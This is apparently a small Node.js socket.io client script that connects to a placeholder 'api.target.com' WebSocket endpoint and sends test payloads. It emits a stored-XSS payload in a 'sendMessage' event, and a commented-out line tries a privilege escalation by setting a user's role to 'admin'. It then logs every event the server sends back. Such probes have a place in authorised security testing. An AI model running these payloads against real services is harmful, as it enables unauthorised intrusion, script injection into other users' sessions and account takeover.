const io = require("socket.io-client");

// Connect to the known WebSocket endpoint
const socket = io("https://api.target.com", {
  path: "/socket.io",              // very important
  transports: ["websocket"],       // forces WS only
  reconnectionAttempts: 3,
  timeout: 5000
});

// Debug output
socket.on("connect", () => {
  console.log("✅ Connected to WebSocket");

  // Example payload: XSS test
  socket.emit("sendMessage", { msg: "<script>alert(1)</script>" });

  // Example: test privilege escalation
//   socket.emit("updateRole", { userId: "123", role: "admin" });
});

socket.on("connect_error", (err) => {
  console.error("❌ Connection error:", err.message);
});

socket.on("disconnect", (reason) => {
  console.log("🔌 Disconnected:", reason);
});

socket.onAny((event, data) => {
  console.log(`📥 Event received [${event}]:`, data);
});
